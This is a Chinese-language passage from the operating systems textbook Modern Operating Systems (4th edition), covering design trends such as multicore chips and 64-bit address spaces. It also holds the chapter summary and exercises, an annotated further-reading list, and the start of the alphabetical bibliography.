曾经有段时间，内存非常缺乏，以至于编程者对于每一个Byte的内容都知道得一清二楚。
现在，程 序员们很少会为浪费了几兆空间而担心。
对于绝大多数应用程序来说，内存已经不再是稀缺资源。
如果 处理器核心资源变得同样丰富呢?
换句话说，随着制造商在一个芯片上放置越来越多的处理器核心，多 到编程者无需再为处理器核心的浪费而担心，事情会变成什么样呢?
另一个问题是：我们需要什么类型的处理器核心?
允许高频率乱序执行和预测执行且具有深流水线 的超标量处理器核心，对于执行顺序代码而言也许非常不错，但是在能耗上却没那么好。
如果要执行的 任务中包含大量的并发执行代码，它们也帮不上太多的忙。
很多应用程序如果能够得到更多的小而简单 的处理器核心会运行得更好。
有专家为异构多核辩护，但是其问题是相同的：什么样的处理器核心?
需 要多少?
速度多快?
这里甚至还没有开始涉及运行一个操作系统及其之上的所有软件的问题。
操作系统 会运行在所有或是部分核心上?
网络栈需要设置一个还是多个?
需要做到什么程度的共享?
是否将特定 的操作系统功能(如网络栈或存储栈)对应到某些特定的处理器核心上完成?
如果这样做，需不需要复 制这些功能来达到更好的可扩展性?
12 .6 .3大型地址空间操作系统
随着计算机从32位地址空间转向64位地址空间，操作系统设计中的重大转变成为可能。
32位地址空 间并不大。
如果你通过给地球上的每个人提供他或她自己的字节来试图分割2³2个字节，那么将没有足够 的字节可以提供。
相反，2⁶⁴大约是2×10¹⁹。
现在每个人可以得到他或她个人的3GB大的一块。
对于2×10¹⁹字节的地址空间我们能做什么呢?
首先，可以淘汰文件系统概念。
作为替代，所有文 件在概念上可以始终保存在(虚拟)内存中。
毕竟在那里存在足够的空间，可以放下超过10亿部全长的 电影，每一部压缩到4GB。
另一个可能的用途是永久对象存储。
对象可以在地址空间中创建，并且保存在那里直到所有对它们 的引用消失，在此时它们可以自动被删除。
这样的对象在地址空间中是永久的，甚至是在关机和重新启 动计算机的时候。
有了64位的地址空间，在用光地址空间之前，可以用每秒100MB 的速率创建对象长达 5000年。
当然，为了实际存储这么大量的数据，需要许多磁盘存储器用于分页交换，但是在历史上这是 第一次限制因素是磁盘，而不是地址空间。
由于大量数目的对象在地址空间中，允许多个进程同时在相同的地址空间中运行，以便以一般的方式 共享对象就变得十分有趣了。
这样的设计显然会通向与我们现在所使用的操作系统完全不同的操作系统。
就64位地址而言，另一个必须重新思考的操作系统问题是虚拟内存。
对于2⁴字节的虚拟地址空间 和8KB的页面，我们有2⁵¹个页面。
常规的页表不能很好地按比例变换到这样的大小，所以需要别的东西。
反转的页表是可行的，但是也有人提出了其他的想法(Talluri 等人，1995)。
无论如何，64位操作系统 为新的研究提供了大量的余地。
12.6.4 无缝的数据访问
自从计算时代的黎明降临，这台设备与那台设备始终是有区别的。
也就是说，如果数据在这台设备 上，你就无法从那台设备上访问数据，除非你事先进行了数据传输。
同样，即使你有数据，在安装了正 确的软件之前也无法使用它。
这种模型现在正在发生变化。
Dropbox 、GoogleDrive 、iCloud 和SkyDrive) 将数据存储在云端。
所有存放在云端的文件可以通过连接 到网络的任意设备访问。
此外，访问数据的程序常常也驻留在云端，所以甚至不需要安装这些程序。
这 种方式允许用户轻易地通过智能手机使用与修改文档文件、表格文件、演示文稿文件。
一般而言，这被 视为是一种进步。
12.6.5 电池供电的计算机
功能强大的桌面计算机可拥有64位地址空间、高带宽网络、多处理器以及高品质的音频和视频，这 已经成为现在桌面系统的标准，并且正在快速地成为笔记本电脑、平板电脑甚至智能手机的标准。
随着 这种趋势的流行，它们的操作系统必然与目前的操作系统有重大的区别，以便处理这些需求。
除此之外， 它们还必须做到耗能与降温的平衡。
散热和能耗即使在高端计算机中也是最重要的挑战之一。
对于Web的访问现在需要特殊的程序(浏览器),将来可能会以一种无缝的方式完全集成到操作系 统中。
存储信息的标准方式可能会变为Web页面，并且这些页面可能包含各种各样的非文本项目，包括 音频、视频、程序以及其他，它们全部作为操作系统的基本数据而管理。
12.6.6 嵌入式系统
对于嵌入式系统而言， 一种有希望的思路是可扩展的操作系统(例如Paramecium 和Exokernel) 。
这 些操作系统可以随着应用程序的需要而被构建成轻量级的或重量级的，但是以一种应用程序间一致的方 式。
因为嵌入式系统将以上亿的量级生产，所以对于新型操作系统而言这是一个主要的市场。
12.7 小结
操作系统的设计开始于确定它应该做什么。
接口应该是简单、完备且高效的。
应该拥有一个清晰的 用户界面范型、执行范型和数据范型。
结构、命名、绑定时机以及模块实现次序这样的一些问题上。
性能是重要的，但是优化应该仔细地选择，从而使优化不至于破坏系统的结构。
空间-时间权衡、 高速缓存、线索、利用局部性以及优化常见的情况等技术通常都值得尝试。
两三个人编写一个系统与300个人生产一个大型系统是不同的。
在后一种情况下，团队结构和项目 管理对于项目的成败起着至关重要的作用。
最后，操作系统正在进行变革以跟上新的趋势和迎接新的挑战。
这些趋势和挑战包括基于管理程序 的系统、多核系统、64位地址空间、掌上无线计算机、嵌入式系统。
毫无疑问，对于操作系统设计人员 来说今后几年将十分令人激动。
习题
1. 摩尔定律 (Moore's law) 描述了一种指数增长 现象，类似于将一个动物物种引入到具有充足 食物并且没有天敌的新环境中生长。
本质上， 随着食物供应变得有限或者食肉动物学会了捕 食新的被捕食者， 一条指数增长曲线可能最终 成为一条具有一个渐进极限的S 形曲线。
讨论可 能最终限制计算机硬件改进速率的因素。
2.图13-1显示了两种范型：算法范型和事件驱动 范型。
对于下述每一种程序，哪一范型可能更 容易使用：
(a) 编译器
(b) 照片编辑程序
(c) 工资单程序
3. 在某些早期的苹果Macintosh 计算机上，GUI 代 码是在ROM中的。
为什么?
4.Corbató 的格言是系统应该提供最小机制。
这里 是一份POSIX 调用的列表，这些调用也存在于 UNIX版本7中。
哪些是冗余的?
换句话说，哪 些可以被删除而不损失功能性，因为其他调用 的简单组合可以做同样的工作并具有大体相同 的性能。
access、alarm、chdir、chmod、chown, chroot 、close 、creat 、dup 、exec 、exit 、fcntl、
fork 、fstat 、ioct1 、kill 、link 、Iseek 、mkdir、
mknod 、open 、pause 、pipe 、read 、stat 、time、 times 、umask 、unlink 、utime 、wait 和write。
5.假设图12-2中层次3和层次4互换，对系统的设 计会有什么影响?
费多少时间运行?
8.操作系统经常在外部和内部这两个不同的层次上 实现命名。
这些名字就如下性质有什么区别?
(a) 长度
(b)唯一性
(c)层次结构
9.处理大小事先未知的表格的一种方法是将其大 小固定，但是当表格填满时，用一个更大的表 格取代它，并且将旧的表项复制到新表中，然 后释放旧的表格。
使新表的大小是原始表格大 小的2倍，与新表的大小只是原始表格大小的 1.5倍相比，有什么优点和缺点?
10. 在图12-5中，标志found 用于表明是否找到一 个PID。
忽略found 而只是在循环的结尾处测试 p以了解是否到达结尾，这样做可行吗?
11. 在图13-6中，条件编译隐藏了Pentium 与Ultra SPARC的区别。
相同的方法可以用于隐藏拥有 一块IDE磁盘作为唯一磁盘的Pentium 与拥有一 块SCSI 磁盘作为唯一磁盘的Pentium 之间的区 别吗?
这是一个好的思路吗?
13.可重入的过程能够拥有私有静态全局变量吗?
讨论你的答案。
14. 图12-7b中的宏显然比图12-7a中的过程效率更 高。
然而，它的一个缺点是难于阅读。
它还存 在其他缺点吗?
如果有的话，还有哪些缺点?
16. 在图12-8中，我们看到GIF文件如何使用8位的
值作为索引检索一个调色板。
相同的思路可以 用于16位宽的调色板。
在什么情况下(如果有 的话),24位的调色板是一个好的思路?
19.即使一个远程文件因为记录了一个线索而没有被 删除，它也可能在最后一次引用之后发生了改变。
有哪些可能有用的其他信息要记录?
20.考虑一个系统，它将对远程文件的引用作为线 索而储藏，例如形如(名字，远程主机，远程 名字)。
一个远程文件悄悄地被删除然后被取 代是可能的。
那么线索将取回错误的文件。
怎 样才能使这一问题尽可能少地发生?
21.我们在正文中阐述了局部性经常可以被用来改 进性能。
但是，考虑一种情况，其中一个程序 从一个数据源读取输入并且连续地输出到两个 或多个文件中。
试图利用文件系统中的局部性 在这里可能会导致效率的降低吗?
存在解决这 一问题的方法吗?
22.Fred Brooks声称一名程序员每年只能编写1000
行调试好的代码，然而MINIX 的第 一 版 (13000行代码)是一个人在3年之内创作的。
怎样解释这一矛盾?
23. 使 用Brooks 每名程序员每年1000行的数字，估 计生产Windows Vista花费的资金数量。
假设 一名程序员每年的成本是100000美元(包括 日常开销，例如计算机、办公空间、秘书支持 以及管理开销)。
你相信这一答案吗?
如果不 相信，什么地方有错误?
24.随着内存越来越便宜，可以设想一台计算机拥 有巨大容量的电池供电的RAM 来取代硬盘。
以当前的价格，仅有RAM的低端PC成本是多 少?
假设1GB的RAM盘对于低端机器是足够 的。
这样的机器有竞争力吗?
25.列举某个装置内部的嵌入式系统中不需要用到 的常规操作系统的某些功能特性。
28.编写一个在内存模拟中的文件系统。
第13章|
Modern Operating Systems,Fourth Edition
参考书目与文献
在之前的12章中我们已经涉及了多个主题。
本章的目的在于向那些希望对操作系统进行进一步研 究的读者提供一些帮助。
13.1节列出了向读者推荐的阅读材料，13.2节按照字母顺序列出了本书中所引 用的所有书籍和文章。
13.1 进行深入阅读的建议
在以下各小节中，我们给出一些深人阅读的建议。
与本书中标题为“有关……的研究”小节中引用 的那些有关当前研究工作的文章不同，这些参考资料实际上多数属于人门和培训一类的。
不过，可以把 它们看作本书中所介绍内容的不同视角和不同侧重点。
13.1.1 引论
Silberschatz et al.,Operating System Concept,9th ed.
一本关于操作系统的教材，涵盖了进程、内存管理、存储管理、安全与保护、分布式系统和一些专 用系统等方面的内容。
书里面给出了两个学习案例： Linux 和 Windows 7。
书的封面上画满了恐龙这一 古老的物种，寓意着操作系统这项研究也已日久年深。
Stallings,Operating Systems,7th ed.
这是有关操作系统的另一本教科书。
它涵盖了所有传统的内容，还包括少量分布式系统的内容。
Stevens and Rago,Advanced Programming in the UNIX Environment
该书叙述如何使用UNIX系统调用接口以及标准C 库编写C 程序。
有基于System V第4版以及 UNIX 4.4 BSD版的例子。
有关这些实现与POSIX 的关系在书中有具体叙述。
Tanenbaum and Woodhull,Operating Systems Design and Implementation
一个通过动手实践来学习操作系统的方法。
这本书主要介绍了一些常见的原理，另外详细介绍了一 个真实的操作系统—MINIX3, 并且附带了这个操作系统的清单。
13.1.2 进程与线程
书中的第一部分专注于CPU 的虚拟化，从而使多线程能够共享CPU。
这本书的优点在于(不仅在 于实际上有线上的免费版),它不仅介绍了关于进程和进程调度方法的概念，同样还有关于API 以及系统 调用fork 和 exec 的详细介绍。
Andrews and Schneider,Concepts and Notations for Concurrent Programming
这是一本关于进程和进程间通信的教程，包括忙等待、信号量、管程、消息传递以及其他技术。
文 章中同时也说明了这些概念是如何嵌入到不同编程语言中去的。
这篇文章非常老，但是却经受住了时间 的考验。
Ben-Ari,Principles of Concurrent Programming
这本书专门讨论了进程间的通信问题，其他章节则讨论了互斥性、信号量、管程以及哲学家就餐问 题等。
同样，这么多年来它也经受住了时间的考验。
Zhuravlev et al.,Survey of Scheduling Techniques for Addressing Shared Resources in Multicore
Processors
Silberschatz et al.,Operating System Concepts,9th ed.
该书第3~6章讨论了进程与进程间通信，包括调度、临界区、信号量、管程以及经典的进程间通信 问题。
Stratton et al.,Algorithm and Data Optimization Techniques for Scaling to Massively Threaded Systems
编写一个拥有六个线程的系统是非常困难的。
那么当你有成千上万的线程时会发生什么呢?
说它是 复杂的是为了将它变得简单。
这篇文章讨论了一些实践方法。
13.1.3 内存管理
Denning,Virtual Memory
Denning,Working Sets Past and Present
该书很好地阐述了大容量存储器的管理和页面置换算法。
书后附有完整的参考文献。
虽然其中很多 文章都非常老了，但是原理实际根本没有变化。
Knuth,The Art of Computer Programming,Vol.1
该书讨论并比较了首次适配算法、最佳适配算法和其他一些存储管理算法。
这本书的第12、13章有大量关于虚拟内存的内容，其中包括对页面置换策略的综述。
13.1.4 文件系统
McKusick et al,A Fast File System for UNIX
在4.2 BSD 环境下重新实现了UNIX的文件系统。
该文描述了新文件系统的设计，并把重点放在其 性能上。
Silberschatz et al,Operating System Concepts,9th ed.
该书第10~12章与文件系统有关，涉及文件操作、文件访问方式、目录、实现以及其他内容。
Stallings,Operating Systems,7th ed
该书第12章包括许多有关文件系统的内容，还有一些有关安全的内容。
Cornwell,Anatomy ofa Solid-state Drive
如果你对固态硬盘感兴趣，那么Michael Cornwell的介绍是一个不错的起点。
特别是作者简单介绍 了传统硬盘与SSD 的区别。
13.1.5 输入/输出
Geist and Daniel,A Continuum of Disk Scheduling Algorithms
该文给出了一个通用的磁盘臂调度算法，并给出了详细的模拟和实验结果。
Scheible,A Survey of Storage Options
现在存储的方法很多：DRAM,SRAM,SDRAM, 闪存，硬盘，软盘，CD-ROM,DVD, 还有磁带等。
这篇文章对这些技术进行了研究，着重总结了它们的优缺点。
Stan and Skadron,Power-Aware Computing
能源问题始终是移动设备的主要问题，直到有人能设法将摩尔定律运用于电池技术为止。
能源和温 度日益重要以至于操作系统需要能够感知CPU 温度并适应它。
这篇文章就是针对这些问题的一个综述， 同时介绍对能源感知计算中的计算机这一特定问题的5篇文章。
Swanson and Caulfield,Refactor,Reduce,Recycle:Restructuring the I/O SStack for the Future of Storage
硬盘存在有两个原因：断电时RAM 会丢失内容；同时，硬盘的容量非常大。
但是假设断电时RAM 不丢失内容呢?
这将对I/O 硬盘带来怎样的改变?
这篇文章介绍了非易失性存储以及它对系统的改变。
586 第 1 3 章
Ion,From Touch Displays to the Surface:A Brief History of Touchscreen Technology
触摸屏在很短的时间内便已普及。
这篇文章以简明易懂的解释和陈年佳酿般的图片与视频，沿着触 摸屏的历史进行了探索。
真是令人着迷!
Walker and Cragon,Interrupt Processing in Concurrent Processors
在超标量计算机中精确实现中断是一项具有挑战性的工作。
其技巧在于将状态序列化并且快速地完 成这项工作。
文中讨论了许多设计问题以及相关的权衡考虑。
13.1.6 死 锁
Coffman et al.,System Deadlocks
该文简要介绍了死锁、死锁的产生原因以及如何预防和检测。
Holt,Some Deadlock Properties of Computer Systems
该文围绕死锁进行了讨论。
Holt 引入了一个可用来分析某些死锁情况的有向图模型。
Isloor and Marsland,The Deadlock Problem:An Overview
这是关于死锁的入门教程，重点放在了数据库系统，也介绍了多种模型和算法。
Levine,Defining Deadlock
这本书的第6章聚焦于资源死锁，几乎没有涉及其他类型。
这篇简短的论文中指明现有文献中出现 了关于死锁的多种定义，并区分了它们之间微妙的不同。
作者接着着眼于通信、调度以及交叉死锁，并 且想出了一个新的模型试图涵盖所有类型的死锁。
Shub,A Unified Treatment of Deadlock
这是一部关于死锁产生和解决的简短综述，同时也给出了一些在教学时应当强调内容的建议。
13.1.7 虚拟化和云
Portnoy,Virtualization Essentials
有关虚拟化的总体介绍，涉及环境(包括虚拟化和云之间的关系)以及许多方案(更多地强调了 VMware)。
Erl et al.,Cloud Computing:Concepts,Technology&Architecture
一本从广泛的视角专注于云计算的书。
作者详细介绍了IAAS 、PAAS 、SAAS 等缩略词的意思，还 有 “X”As A Service的成员。
Rosenblum and Garfinkel,Virtual Machine Monitors:Current Technology and Future Trends
这篇文章以虚拟机管理的历史作为开始，接着讨论了当前的CPU 状态、内存以及1/O 虚拟机。
此 外，文中还涉及以上三个方面面临的各种难题以及未来硬件如何缓解这些难题。
Whitaker et al.,Rethinking the Design of Virtual Machine Monitors
13.1.8 多处理机系统
Ahmad,Gigantic Clusters:Where Are They and What Are They Doing?
为了了解大型多计算机系统的先进性，可以读这篇文章。
它描述了这一思想，并且给出了对当前在使 用的一些大型系统的概况介绍。
根据摩尔定律可以合理推断，这里提到的规模大约每两年就会增长一倍。
Dubois et al.,Synchronization,Coherence,and Event Ordering in Multiprocessors
该文是一个关于基于共享存储器多处理器系统中同步问题的指南，而且，其中的一些思想对于单处 理器和分布式存储系统也是适用的。
Geer,For Programmers,Multicore Chips Mean Multiple Challenges
多核芯片的时代正在到来——不论软件界的人们是否准备好。
实际上他们并没有准备好，而且为 这些芯片编写程序往往是巨大的挑战，这包括选择合适的工具、将有关工作划分成小的部分，以及测 试结果等。
Kant and Mohapatra,Internet Data Centers
Internet 数据中心是一个被兴奋剂刺激起来的巨大多计算机。
常常让成千上万台计算机为一个应用
软件而工作。
这里的主要问题就是可伸缩性、可维护性和能源。
这篇文章既是对有关问题的一个介绍， 也是对同一个问题的其他4篇文章的介绍。
Kumar et al.,Heterogeneous Chip Multiprocessors
用在台式电脑上的多核芯片是对称的——每一个核是相同的。
然而对一些应用软件来说，异构的多 处理器(Chip multiprocessors,CMPS)是很普遍的，有的核用来计算、有的处理视频编码、有的处理音 频编码等。
这篇文章就讨论异构多处理器的有关问题。
Kwok and Ahmad,Static Scheduling Algorithms for Allocating Directed Task Graphs to Multiprocessors
如果提前知道所有作业的特性，就可能对多计算机系统或者多处理器进行优化作业调度。
问题在于 最优调度的计算时间会很长。
在这篇论文中，作者讨论并且比较了用不同方法解决这个问题的27种著 名的算法。
Zhuravlev et al.,Survey of Scheduling Techniques for Addressing Shared Resources in Multicore Processors
如前所述，多处理器系统中最重要的挑战之一是共享资源的竞争。
这项调查提出了不同的调度技术 来处理这种竞争。
13.1.9 安 全
Anderson,Security Engineering,2nd Edition
Van der Veen et al.,Memory Errors:the Past,the Present,and the Future
关于内存错误(包括缓冲溢出、格式字符串攻击、悬空指针以及其他错误)的历史回顾，其中包括 攻击与防御、逃避防御的攻击、阻止逃避早期防御的攻击的新防御等，你都会有所了解。
作者展示了尽 管内存攻击手段已经很陈旧，而且其他攻击手段都在不断增强，但是内存错误仍然是非常重要的攻击途 径。
更重要的是，他们认为这种情况在短期之内不会有任何改变。
Bratus,What Hackers Learn That the Rest of Us Don't
Bratus et al.,From Buffer Overflows to Weird Machines and Theory of Computation
Denning,Information Warfare and Security
信息已经变成了战争武器，既是军事武器也是军事配合武器。
参与者不仅尝试攻击对方的信息系 统，而且要防卫好自己的系统。
在这本吸引人的书中，作者讨论了所有能想到的关于攻击策略和防卫策 略的话题，从数据欺骗到包窥探器。
该书对于计算机安全有极大兴趣的读者来说是必读的。
Ford and Allen,How Not to Be Seen
病毒，间谍软件，rootkits和数字版权管理系统都对隐藏数据情有独钟。
这篇文章对各种隐身的方 法进行了简要的介绍。
Hafner and Markoff,Cyberpunk
Johnson and Jajodia,Exploring Steganography:Seeing the Unseen
隐身术具有悠久的历史，可以回到利用信使的头发隐藏信息的时代，那时先将信使的头发剃光，然 后在剃光的头上文上信息，之后在信使的头发长出来之后再将他送走。
尽管当前的技术很多，但是它们
也是数字化的。
本书对于想在这一主题彻底入门的读者来说是一个开端。
Ludwig,The Litte Black Book of Email Viruses
如果想编写反病毒软件并且想了解在位级别(bit level)上这些病毒是怎么工作的，那么这本书很适 合。
每种病毒都有详细的讨论并且也提供了绝大多数的实际代码。
但是，要求读者透彻掌握Pentium 汇 编语言编程知识。
Mead,Who is Liable for Insecure Systems?
很多有关计算机安全的措施都是从技术角度出发的，但是这不是唯一的角度。
也许软件经销商应 该对由于他们的问题软件而带来的损失负起责任。
如果比现在更多地关注于安全，这会是经销商的机会 吗?
对这个提法感兴趣吗?
可以读一下这篇文章。
Milojicic,Security and Privacy
安全性涉及很多方面，包括操作系统、网络、私密性表示等。
在这篇文章中，6位安全方面的专家 给出了他们各自关于这个主题的想法和见解。
Nachenberg,Computer Virus-Antivirus Coevolution
当反病毒的开发人员找到一种方法能够探测某种电脑病毒并且使其失效时，病毒的编写者已经在改 进和开发更强的病毒。
本书探讨了这种制造病毒和反病毒之间的“猫和老鼠”游戏。
作者对于反病毒编 写者能否取胜这场游戏并不持乐观态度，这对电脑用户来说也许不是一个好消息。
Sasse,Red-Eye Blink,Bendy Shufle,and the Yuck Factor:A User Experience of Biometric Airport Systems 作者讲述了他在许多大机场所经历的瞳孔识别系统的体验。
不是所有的体验都是正面的。
Thibadeau,Trusted Computing for Disk Drives and Other Peripherals
如果读者认为磁盘驱动器只是一个储存比特的地方，那么最好再考虑一下。
现代的磁盘驱动器有非常 强大的CPU, 兆 级 的RAM, 多个通信通道甚至有自己的启动ROM 。
简而言之，它就是一个完整的计算机 系统，很容易被攻击，因此它也需要有自己的保护机制。
这篇文章讨论的就是磁盘驱动器的安全问题。
13.1.10 实例研究1: UNIX、Linux 和 Android
Bovet and Cesati,Understanding the Linux Kernel
该书也许是对Linux 内核整体知识讨论最好的一本书。
它涵盖了进程、存储管理、文件系统和信号 等内容。
IEEE,Information Technology——Portable Operating System Interface(POSIX),Part 1:System
Application Program Interface(API)[CLanguage]
这是一个标准。
一些部分确实值得一读，特别是附录B, 清晰阐述了为什么要这样做。
参考标准的 一个好处在于通过定义不会出现错误。
例如，如果一个宏的名字中的排字错误贯穿了整个编辑过程，那 么它将不再是一个错误，而成为一种正式标准。
Fusco,The Linux Programmers'Toolbox
这本书是为那些知道一些基本Linux 知识，并且希望能够进一步了解Linux 程序如何工作的中级读 者们写作的。
该书假定读者是一个C 程序员。
Maxwell,Linux Core Kernel Commentary
该书的前400页给出了Linux 的内核源代码的一个子集。
后面的150页则是对这些代码的评述。
与 John Lions的经典书籍(1996)风格很相似。
如果你想了解Linux 内核的很多细节，那么这是一个不错 的起点，但是读40000行C 语言代码不是每个人都必需的。
13.1.11 实例研究2: Windows 8
Cusumano and Selby,How Microsoft Builds Software
你是否曾经好奇过一个人如何能够写出29000000行代码(就像Windows 2000一样),并且让它作 为一个整体运转起来?
希望探究微软是如何采用建造和测试循环来管理大型软件项目的读者，可以参看 这篇论文。
其过程相当有启发性。
Rector and Newcomer,Win32 Programming
如果想找一本1500页的书，告诉你如何编写Windows 程序，那么读这本书是一个不错的开始。
它
涵盖了窗口、设备、图形输出、键盘和鼠标输入、打印、存储管理、库和同步等许多主题。
阅读这本书 要求读者具有C 或 者C++ 语言的知识。
Russinovich and Solomon,Windows Internals,Part 1
如果想学习如何使用Windows, 可能会有几百种相关的书。
如果想知道Windows内部如何工作的，本 书是读者最好的选择。
它给出了很多内部算法和数据结构以及可观的技术细节。
没有任何一本书可以替代。
13.1.12 操作系统设计
Saltzer and Kaashoek,Principles of Computer System Design:An Introduction
这本书从整体上看是在讲计算机系统，而不是关注操作系统的各个部分，但是他们定义的许多原理 在操作系统中都有着广泛的应用。
书中非常谨慎地定义了一些“基本理念”,比如名称、文件系统、读写 一致、已验证的和机密的消息等，阅读这些内容是非常有趣的。
在我们看来，原则上全世界的计算机科 学家每天都该在工作前诵读这些内容。
Brooks,The Mythical Man Month:Essays On Software Engineering
Fred Brooks是 IBM的 OS/360 的主要设计者之一。
以其丰富的经验，他知道在计算机的设计中什么 是可以运行的和什么是不能运行的。
在这本诙谐且内涵丰富的书中，他25年前给出的建议现在一样是 可行的。
Cooke et al.,UNIX and Beyond:An Interview with Ken Thompson
Corbató,On Building Systems That Will Fail
在获得图灵奖的演讲大会上，这位分时系统之父阐述了许多Brooks 在《人月神话》中同样关注的 问题。
他的结论是所有的复杂系统都将最终失败，为了设计一个成功的系统，避免复杂化、追求设计上 的优雅风格和简单化原则是绝对重要的。
Crowley,Operating Systems:A Design-Oriented Approach
大多数介绍操作系统的教材仅仅是讲操作系统的基本概念(进程调度、虚拟内存等)和列举一些例 子，对于如何设计一个操作系统却没有提及。
该书独一无二的特点在于有4章是说明如何设计一个操作 系统的。
Lampson,Hints for Computer System Design
Butler Lampson——世界上最主要的具有创新性的操作系统设计者之一，在他多年的设计经历中总 结了许多设计方法、对设计的建议和一些指导原则并写下这篇诙谐的内涵丰富的文章，正如Brooks 的 书 一样，对于有抱负的操作系统的设计者来说，这本书一定不要错过。
Wirth,A Plea for Lean Software
Niklaus Wirth是一名经验丰富的著名系统设计师，他基于一些简单概念制作了一款至精至简的软 件，完全不同于某些臃肿而混乱的商业软件。
他以自己的Oberon 系统来阐明观点，这是一款面向网络、 基于图形用户的操作系统，只有200KB, 包 括Oberon 编译器和文本编辑器。
13.2 按字母顺序排序的参考文献
ABDEL-HAMID,T,and MADNICK, S.:Software Project Dynamics:An Integrated
Approach,Upper Saddle River,NJ:Prentice Hall,1991.
ACCETTA,M.,BARON,R.,GOLUB,D.,RASHID,R.,TEVANIAN,A.,and YOUNG,M.:
“Mach:A New Kernel Foundation for UNIX Development,”Proc.USENIX Summer
Conf,USENIX,pp.93-112,1986.
ADAMS,G.B.II,AGRAWAL,D.P.,and SIEGEL,H.J:“A Survey and Comparison of Fault-
Tolerant Multistage Interconnection Networks,"Computer,vol.20,pp.14-27,June 1987.
ADAMS,K.,and AGESEN,O.:“A Comparison of Software and Hardware Technqiues for X86 Virtualization,"Proc.12th Int'l Conf.on Arch.Support for Prog.Lang.and Oper- ating Systems,ACM,pp.2-13,2006.
AGESEN,O,MATTSON,J.,RUGINA,R.,and Avoiding Hardware Virtualization
SHELDON,J.: “Software Techniques for Exits,”Proc.USENLX Ann.Tech.Conf,USENIX,
2012.
AHMAD,I: “Gigantic Clusters:Where Are They and What Are They Doing?
”IEEE Con- currency,vol.8,pp.83-85,April-June 2000.
AHN,B.-S.,SOHN,S.-H.,KIM,S.-Y.,CHA,G.-1.,BAEK,Y.-C,JUNG,S.-L,and KIM,M.-J.:
"Implementation and Evaluation of EXT3NS Multimedia File System,"Proc.12th
Ann.Int'l Conf.on Multimedia,ACM,pp.588-595,2004.
ALBATH,J.,THAKUR,M.,and MADRIA,S.:“Energy Constraint Clustering Algorithms
for Wireless Sensor Networks,"J.Ad Hoc Networks,vol.11,pp.2512-2525,Nov. 2013.
AMSDEN,Z.,ARAI,D.,HECHT,D.,HOLLER,A.,and SUBRAHMANYAM,P.:“VMI:An
Interface for Paravirtualization,"Proc.2006 Linux Symp.,2006.
ANDERSON,D.:SATA Storage Technology:Serial ATA,Mindshare,2007.
ANDERSON,T.E.:“The Performance of Spin Lock Alternatives for Shared-Memory Multi-
processors,"IEEE Trans.on Parallel and Distr:Systems,vol.1,pp.6-16,Jan.1990.
ANDERSON,T.E.,BERSHAD,B.N.,LAZOWSKA,E.D.,and LEVY,H.M.:"Scheduler Acti- vations:Effective Kernel Support for the User-Level Management of Parallelism," ACM Trans.on Computer Systems,vol.10,pp.53-79,Feb.1992.
ANDREWS,G.R.: Concurrent Programming—Principles and Practice,Redwood City,CA: Benjamin/Cummings,1991.
ANDREWS,G.R.,and SCHNEIDER,F.B.: “Concepts and Notations for Concurrent Pro- gramming,"Computing Surveys,vol.15,pp.3-43,March 1983.
APPUSWAMY,R.,VAN MOOLENBROEK,D.C,and TANENBAUM,A.S.:"Flexible,Modu- lar File Volume Virtualization in Loris,"Proc.27th Symp.on Mass Storage Systems and Tech.,IEEE,pp.1-14,2011.
ARNAB,A.,and HUTCHISON,A.:"Piracy and Content Protection in the Broadband Age," Proc.S.African Telecomm.Netw.and Appl.Conf,2006.
ARON,M.,and DRUSCHEL,P:“Soft Timers:Efficient Microsecond Software Timer Sup- port for Network Processing,"Proc.17th Symp.on Operating Systems Principles, ACM,pp.223-246,1999.
BAKER,F.T.:“Chief Programmer Team Management of Production Programming,”IBM Systems J,vol.11,pp.1,1972.
BAKER,M.,SHAH,M.,ROSENTHAL,D.S.H.,ROUSSOPOULOS,M.,MANIATIS,P.,
GIULI,TJ,and BUNGALE,P:“A Fresh Look at the Reliability of Long-Term Digital Storage,"Proc.First European Conf.on Computer Systems (EUROSYS),ACM,pp. 221-234,2006.
BALA,K.,KAASHOEK,M.E,and WEIHL,W:"Software Prefetching and Caching for
Translation Lookaside Buffers,"Proc.First Symp.on Operating Systems Design and Implementation,USENIX,pp.243-254,1994.
BARHAM,P.,DRAGOVIC,B.,FRASER,K.,HAND,S.,HARRIS,T,HO,A.,NEUGE-
BAUER,R.,PRATT,L,and WARFIELD,A:“Xen and the Art of Virtualization,”Proc.
19th Symp.on Operating Systems Principles,ACM,pp.164-177,2003.
BARNI,M.: "Processing Encrypted Signals:A New Frontier for Multimedia Security," Proc.Eighth Workshop on Multimedia and Security,ACM,pp.1-10,2006.
BARR,K.,BUNGALE,P.,DEASY,S.,GYURIS,V.,HUNG,P.,NEWELL,C.,TUCH,H.,and
ZOPPIS,B.: "The VMware Mobile Virtualization Platform:Is That a Hypervisor in
Your Pocket?
”ACM SIGOPS Operating Systems Rev,vol.44,pp.124-135,Dec. 2010.
BARWINSKI,M.,IRVINE,C.,and LEVIN,T.: “Empirical Study of Drive-By-Download
Spyware,"Proc.Int'l Conf.onI-Warfare and Security,Academic Confs.Int'l,2006.
BASILLI,V.R.,and PERRICONE,B.T.:“Software Errors and Complexity:An Empirical Study,"Commun.of the ACM,vol.27,pp.42-52,Jan.1984.
BAUMANN,A.,BARHAM,P.,DAGAND,P.,HARRIS,T.,ISAACS,R.,PETER,S.,ROSCOE,
T.,SCHUPBACH,A.,and SINGHANIA,A.:"The Multikernel:A New OS Architecture for Scalable Multicore Systems,"Proc.22nd Symp.on Operating Systems Principles, ACM,pp.29-44,2009.
BAYS,C.:“A Comparison of Next-Fit,First-Fit,and Best-Fit,”Commun.of the ACM,vol.
20,pp.191-192,March 1977.
BEHAM,M.,VLAD,M.,and REISER,H.: "Intrusion Detection and Honeypots in Nested
Virtualization Environments,"Proc.43rd Conf.on Dependable Systems and Networks, IEEE,pp.1-6,2013.
BELAY,A.,BITTAU,A.,MASHTIZADEH,A.,TEREI,D.,MAZIERES,D.,and
KOZYRAKIS,C .:"Dune:Safe User-level Access to Privileged CPU Features,"Proc. Ninth Symp.on Operating Systems Design and Implementation,USENIX,pp. 335-348,2010.
BELL,D,and LA PADULA,L.:"Secure Computer Systems:Mathematical Foundations and Model,"Technical Report MTR 2547v2,Mitre Corp.,Nov.1973.
BEN-ARI,M.: Principles of Concurrent and Distributed Programming,Upper Saddle River,NJ:Prentice Hall,2006.
BEN-YEHUDA,M.,D.DAY,M.,DUBITZKY,Z.,FACTOR,M.,HAR'EL,N,GORDON,A.,
LIGUORI,A.,WASSERMAN,O.,and YASSOUR,B.: "The Turtles Project:Design and Implementation of Nested Virtualization,”Proc.Ninth Symp.on Operating Systems Design and Implementation,USENIX,Art.1-6,2010.
